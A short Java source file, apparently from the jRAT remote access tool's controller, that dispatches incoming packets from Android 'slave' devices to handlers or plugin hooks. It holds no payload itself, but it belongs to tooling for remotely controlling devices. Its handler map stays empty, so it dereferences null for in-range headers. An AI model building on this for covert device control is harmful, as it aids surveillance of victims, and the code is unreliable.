package se.jrat.client.packets.android.incoming;

import java.util.HashMap;
import java.util.Set;

import se.jrat.client.addons.PluginEventHandler;
import se.jrat.client.android.AndroidSlave;
import se.jrat.common.PacketRange;

public class IncomingAndroidPackets {

	private static final HashMap<Byte, Class<? extends AbstractIncomingAndroidPacket>> incomingPackets = new HashMap<Byte, Class<? extends AbstractIncomingAndroidPacket>>();

	public static HashMap<Byte, Class<? extends AbstractIncomingAndroidPacket>> getIncomingPackets() {
		return incomingPackets;
	}

	static {
		reload();
	}

	private static void reload() {
		incomingPackets.clear();
	}

	public static boolean execute(byte header, AndroidSlave slave) {
		try {
			AbstractIncomingAndroidPacket ac = null;
			Set<Byte> set = incomingPackets.keySet();

			for (Byte str : set) {
				if (str == header) {
					ac = incomingPackets.get(str).newInstance();
					break;
				}
			}

			if (header >= 0 && header <= PacketRange.RANGE_INCOMING) {
				ac.read(slave, slave.getDataInputStream());
			} else {
				PluginEventHandler.onPacket(slave, header);
			}

			return ac != null;
		} catch (Exception ex) {
			ex.printStackTrace();
			return false;
		}
	}

}